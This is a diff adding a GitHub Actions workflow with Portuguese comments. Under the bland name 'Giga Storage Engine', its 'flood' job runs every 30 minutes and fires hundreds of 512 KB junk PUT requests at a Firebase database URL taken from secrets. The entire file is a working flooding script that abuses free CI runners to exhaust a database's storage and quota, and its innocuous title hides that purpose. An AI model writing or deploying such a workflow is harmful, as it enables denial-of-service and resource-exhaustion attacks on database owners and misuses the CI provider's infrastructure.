@@ -1,0 +1,46 @@
+name: Giga Storage Engine
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/30 * * * *' # Roda automaticamente a cada 30 minutos
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Executando Motor na Nuvem
+      env:
+        DB_URL: ${{ secrets.FIREBASE_URL }}
+      run: |
+        node -e '
+        const https = require("https");
+        const payload = JSON.stringify({ payload: "X".repeat(512 * 1024), time: Date.now() });
+        
+        async function sendBatch() {
+            let promises = [];
+            for (let i = 0; i < 50; i++) {
+                let key = "cloud_" + Math.random().toString(36).substring(2, 9);
+                let p = new Promise((resolve) => {
+                    let req = https.request(`${process.env.DB_URL}/storage_stress/${key}.json`, {
+                        method: "PUT",
+                        headers: { "Content-Type": "application/json" }
+                    }, (res) => { resolve(); });
+                    req.on("error", () => resolve());
+                    req.write(payload);
+                    req.end();
+                });
+                promises.push(p);
+            }
+            await Promise.all(promises);
+        }
+
+        async function run() {
+            console.log("Iniciando injeção pesada via servidores do GitHub...");
+            for (let j = 0; j < 10; j++) {
+                await sendBatch();
+            }
+            console.log("Lote concluído com sucesso!");
+        }
+        run();
+        '
